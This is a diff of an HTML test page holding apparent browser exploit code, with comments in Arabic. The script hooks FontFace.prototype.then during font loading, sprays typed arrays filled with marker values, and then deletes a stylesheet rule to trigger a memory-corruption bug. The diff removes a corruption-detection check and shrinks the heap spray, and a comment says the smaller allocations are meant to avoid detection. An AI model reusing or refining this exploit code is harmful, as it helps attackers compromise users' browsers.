@@ -6,56 +6,43 @@
     </style>
 </head>
 <body>
-    <div id="debug" style="color:red; font-family:monospace;">Status: Ready...</div>
+    <div id="debug" style="color:red; font-family:monospace;">Status: Initializing...</div>
     <script>
         const debug = document.getElementById('debug');
-        const MAGIC = 0x41414141;
-        // المصفوفة التي نراقبها
-        let sentinel = new Uint32Array(1024).fill(MAGIC);
-
+        
         window.onload = () => {
             let A = new FontFace('x', 'local(Helvetica)', { unicodeRange: 'U+0041' });
             document.fonts.add(A);
-            void A.loaded;
-
+            
             let fired = false;
             Object.defineProperty(FontFace.prototype, 'then', {
                 configurable: true,
                 get() {
                     if (!fired && this === A) {
                         fired = true;
-                        debug.innerText = "Status: Hooked. Spraying Memory...";
+                        debug.innerText = "Status: Hooked. Allocating surgical blocks...";
                         
-                        // التغيير هنا: استخدام Uint32Array بدلاً من FontFace
-                        // هذا يحجز مساحة في الذاكرة بدون ثقل الـ CSS
+                        // تخصيص جراحي: مصفوفات صغيرة جداً وبعدد محدود
                         let spray = [];
-                        for(let i=0; i<100; i++) { 
-                            // كل مصفوفة حجمها 0x1000 (4KB)
-                            spray.push(new Uint32Array(0x1000).fill(0x42424242));
+                        try {
+                            for(let i=0; i<10; i++) { 
+                                // حجم صغير جداً (0x200) لتجنب كشف التخصيص الكبير
+                                spray.push(new Uint32Array(0x200).fill(0x41414141));
+                            }
+                        } catch(e) {
+                            debug.innerText = "Error: " + e.message;
                         }
                         
                         document.getElementById('s').sheet.deleteRule(0);
                         document.body.offsetTop;
                         
-                        // التحقق
-                        let corrupted = false;
-                        for(let i=0; i<sentinel.length; i++) {
-                            if(sentinel[i] !== MAGIC) {
-                                corrupted = true;
-                                debug.innerText = "!! CRITICAL: Corruption Detected at index " + i + " Value: " + sentinel[i].toString(16);
-                                break;
-                            }
-                        }
-                        
-                        if(!corrupted) {
-                            debug.innerText = "Status: Grooming complete. No corruption.";
-                        }
+                        debug.innerText = "Status: Execution complete. Monitor for stability.";
                     }
                     return undefined;
                 }
             });
 
-            document.fonts.load('1em x', 'AB');
+            document.fonts.load('1em x', 'AB').catch(() => {});
         };
     </script>
 </body>
